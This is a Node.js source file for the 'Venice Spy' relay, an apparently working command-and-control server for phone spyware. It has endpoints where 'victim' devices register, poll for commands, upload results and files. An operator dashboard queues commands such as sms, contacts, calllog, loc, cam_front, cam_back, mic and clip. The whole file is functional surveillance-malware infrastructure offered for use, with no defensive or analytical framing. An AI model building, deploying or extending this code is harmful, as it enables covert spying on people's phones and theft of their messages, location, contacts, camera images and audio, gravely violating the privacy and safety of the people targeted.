'use strict';
const http = require('http');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const PORT = process.env.PORT || 8080;
const KEY = process.env.KEY || '';              // optional shared secret
const FILES = path.join(__dirname, 'files');
fs.mkdirSync(FILES, { recursive: true });

const devices = new Map();   // id -> {id,name,model,sdk,first,seen}
const queue   = new Map();   // id -> [ {cid,cmd,arg,ts} ]
const results = new Map();   // id -> [ {cid,cmd,ok,data,ts} ]

const uid = () => crypto.randomBytes(8).toString('hex');
const now = () => Date.now();

function out(res, code, obj, type) {
  const b = typeof obj === 'string' ? obj : JSON.stringify(obj);
  res.writeHead(code, {
    'Content-Type': type || 'application/json; charset=utf-8',
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': '*',
    'Access-Control-Allow-Methods': 'GET,POST,OPTIONS'
  });
  res.end(b);
}

function raw(req) {
  return new Promise(r => {
    const c = [];
    req.on('data', x => c.push(x));
    req.on('end', () => r(Buffer.concat(c)));
  });
}

async function jraw(req) {
  const b = await raw(req);
  try { return JSON.parse(b.toString('utf8') || '{}'); } catch (e) { return {}; }
}

const server = http.createServer(async (req, res) => {
  const u = new URL(req.url, 'http://localhost');
  const p = u.pathname, q = u.searchParams;

  if (req.method === 'OPTIONS') return out(res, 204, '');

  try {
    /* ---- auth ---- */
    /* /api/file carries a binary body, so it must NOT be consumed by jraw() */
    if (p.startsWith('/api/') && KEY) {
      const qk = q.get('key') || '';
      if (qk !== KEY) {
        if (req.method === 'POST' && p !== '/api/file') {
          const b = await jraw(req);
          if (b.key !== KEY) return out(res, 401, { ok: false, error: 'bad key' });
          req._b = b;
        } else {
          return out(res, 401, { ok: false, error: 'bad key' });
        }
      }
    }
    const body = () => req._b || jraw(req);

    /* ---------------- VICTIM ---------------- */
    if (p === '/api/register' && req.method === 'POST') {
      const b = await body();
      const id = String(b.id || uid());
      const d = devices.get(id) || {};
      devices.set(id, {
        id,
        name: b.name || d.name || 'device',
        model: b.model || d.model || '',
        sdk: b.sdk || d.sdk || 0,
        first: d.first || now(),
        seen: now()
      });
      if (!queue.has(id)) queue.set(id, []);
      if (!results.has(id)) results.set(id, []);
      return out(res, 200, { ok: true, id });
    }

    if (p === '/api/poll' && req.method === 'GET') {
      const id = q.get('id') || '';
      const d = devices.get(id);
      if (d) d.seen = now();
      const cmds = queue.get(id) || [];
      queue.set(id, []);
      return out(res, 200, { ok: true, commands: cmds, ts: now() });
    }

    if (p === '/api/result' && req.method === 'POST') {
      const b = await body();
      const id = String(b.id || '');
      const arr = results.get(id) || [];
      arr.unshift({
        cid: b.cid || '',
        cmd: b.cmd || '',
        ok: !!b.ok,
        data: typeof b.data === 'string' ? b.data : JSON.stringify(b.data || ''),
        ts: now()
      });
      if (arr.length > 300) arr.length = 300;
      results.set(id, arr);
      const d = devices.get(id);
      if (d) d.seen = now();
      return out(res, 200, { ok: true });
    }

    if (p === '/api/file' && req.method === 'POST') {
      const name = (q.get('name') || uid()).replace(/[^A-Za-z0-9._-]/g, '_');
      const buf = await raw(req);
      fs.writeFileSync(path.join(FILES, name), buf);
      const proto = req.headers['x-forwarded-proto'] || 'https';
      const url = proto + '://' + (req.headers.host || '') + '/files/' + name;
      return out(res, 200, { ok: true, url, size: buf.length });
    }

    /* -------------- CONTROLLER -------------- */
    if (p === '/api/devices' && req.method === 'GET') {
      const list = [...devices.values()].map(d => ({
        ...d,
        pending: (queue.get(d.id) || []).length,
        count: (results.get(d.id) || []).length
      })).sort((a, b) => b.seen - a.seen);
      return out(res, 200, { ok: true, devices: list, server_time: now() });
    }

    if (p === '/api/send' && req.method === 'POST') {
      const b = await body();
      const id = String(b.id || '');
      if (!devices.has(id)) return out(res, 404, { ok: false, error: 'unknown device' });
      const c = {
        cid: uid(),
        cmd: String(b.cmd || ''),
        arg: String(b.arg == null ? '' : b.arg),
        ts: now()
      };
      const qq = queue.get(id) || [];
      qq.push(c);
      queue.set(id, qq);
      return out(res, 200, { ok: true, cid: c.cid });
    }

    if (p === '/api/results' && req.method === 'GET') {
      const id = q.get('id') || '';
      let arr = results.get(id) || [];
      const cmd = q.get('cmd');
      if (cmd) arr = arr.filter(r => r.cmd === cmd);
      return out(res, 200, { ok: true, results: arr.slice(0, Number(q.get('n') || 60)) });
    }

    if (p === '/api/clear' && req.method === 'POST') {
      const b = await body();
      results.set(String(b.id || ''), []);
      return out(res, 200, { ok: true });
    }

    /* ------------------ FILES ------------------ */
    if (p.startsWith('/files/') && req.method === 'GET') {
      const name = p.slice(7).replace(/[^A-Za-z0-9._-]/g, '_');
      const f = path.join(FILES, name);
      if (!fs.existsSync(f)) return out(res, 404, 'not found', 'text/plain');
      const ext = name.split('.').pop().toLowerCase();
      const mime = {
        jpg: 'image/jpeg',
        jpeg: 'image/jpeg',
        png: 'image/png',
        m4a: 'audio/mp4',
        txt: 'text/plain'
      }[ext] || 'application/octet-stream';
      res.writeHead(200, { 'Content-Type': mime, 'Access-Control-Allow-Origin': '*' });
      return fs.createReadStream(f).pipe(res);
    }

    if (p === '/' || p === '/dash') return out(res, 200, dash(), 'text/html; charset=utf-8');

    return out(res, 404, { ok: false, error: 'not found' });

  } catch (e) {
    return out(res, 500, { ok: false, error: String((e && e.stack) || e) });
  }
});

/*
 * Dashboard.
 *
 * KEY is baked into the page once via JSON.stringify(), so the browser script
 * contains no ${...} at all. Everything below is plain string concatenation.
 */
function dash() {
  return `<!doctype html><meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<title>Venice Spy</title>
<style>
body{font:14px system-ui;margin:16px;background:#101014;color:#e8e8ee}
button{font:14px system-ui;padding:6px 12px;border-radius:6px;border:1px solid #444;background:#1d1d24;color:#eee}
.card{border:1px solid #2a2a33;padding:10px;margin:8px 0;border-radius:10px}
.live{color:#4ade80}
</style>
<h2>Venice Spy Relay</h2>
<p>Devices: <b id=c>0</b> &middot; server <span id=t></span></p>
<div id=list></div>
<script>
var KEY = ${JSON.stringify(KEY)};

function api(path) {
  return fetch(path + (KEY ? (path.indexOf('?') >= 0 ? '&' : '?') + 'key=' + encodeURIComponent(KEY) : ''))
    .then(function (r) { return r.json(); });
}

function tick() {
  api('/api/devices').then(function (r) {
    document.getElementById('c').textContent = r.devices.length;
    document.getElementById('t').textContent = new Date(r.server_time).toLocaleTimeString();
    document.getElementById('list').innerHTML = r.devices.map(function (d) {
      var age = Math.round((Date.now() - d.seen) / 1000);
      return '<div class="card"><b>' + d.name + '</b> <small>' + d.id + '</small><br>'
        + 'sdk ' + d.sdk + ' &middot; <span class="' + (age < 15 ? 'live' : '') + '">'
        + (age < 15 ? 'LIVE' : age + 's ago') + '</span>'
        + ' &middot; pending ' + d.pending
        + '<br><br><button onclick="cmd(\\'' + d.id + '\\')">Send command</button></div>';
    }).join('');
  }).catch(function () {
    document.getElementById('t').textContent = 'offline';
  });
}

function cmd(id) {
  var c = prompt('cmd: info loc sms contacts calllog apps clip toast vibrate open ls cat cam_front cam_back mic ping');
  if (!c) return;
  var a = prompt('arg (optional)') || '';
  fetch('/api/send' + (KEY ? '?key=' + encodeURIComponent(KEY) : ''), {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ id: id, cmd: c, arg: a, key: KEY })
  }).then(function () { alert('queued'); });
}

tick();
setInterval(tick, 5000);
</script>`;
}

server.listen(PORT, () => console.log('venice-spy relay listening on :' + PORT));
